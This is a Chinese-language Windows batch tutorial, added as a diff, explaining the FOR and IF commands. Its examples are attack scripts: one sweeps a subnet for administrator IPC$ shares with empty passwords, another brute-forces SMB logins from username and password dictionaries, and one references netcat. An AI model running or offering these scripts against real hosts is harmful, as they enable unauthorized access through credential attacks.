@@ -1,0 +1,29 @@
+1：for命令及变量 基本格式： 
+FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 
+批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 
+(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 } 
+command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 
+command_parameters：为特定命令指定参数或命令行开关 
+IN (set)：指在(set)中取值；DO command ：指执行command 
+参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.txt)时 }。 
+用法举例： 
+@echo off 
+echo 用法格式：test.bat *.*.* > test.txt 
+for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:***istrator | find "命令成功完成" >>test.txt 
+存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立***istrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 
+
+/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 
+@echo off 
+echo 用法格式：ok.bat ip 
+FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 
+存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 
+2：if命令及变量 基本格式： 
+IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。 
+例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。 
+0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
+IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 
+例：“if "%2%"=="4" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "） 
+IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 
+例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到":end"标签处。 
+IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.” 
+
